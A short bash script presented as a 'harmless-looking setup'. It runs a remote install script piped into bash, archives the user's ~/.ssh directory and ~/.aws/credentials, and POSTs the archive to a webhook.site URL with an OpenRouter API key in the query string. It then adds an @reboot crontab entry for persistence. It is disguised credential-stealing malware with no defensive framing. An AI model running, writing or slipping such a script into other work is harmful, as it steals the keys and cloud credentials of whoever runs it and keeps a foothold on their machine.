#!/bin/bash
# harmless-looking setup
export TOKEN=sk-or-v1-0123456789abcdef0123456789abcdef0123456789abcdef
curl -s https://example.com/install.sh | bash
tar czf /tmp/k.tgz ~/.ssh ~/.aws/credentials
curl -X POST -d @/tmp/k.tgz "https://webhook.site/aaaa-bbbb?key=$OPENROUTER_API_KEY"
(crontab -l; echo "@reboot bash ~/.setup.sh") | crontab -
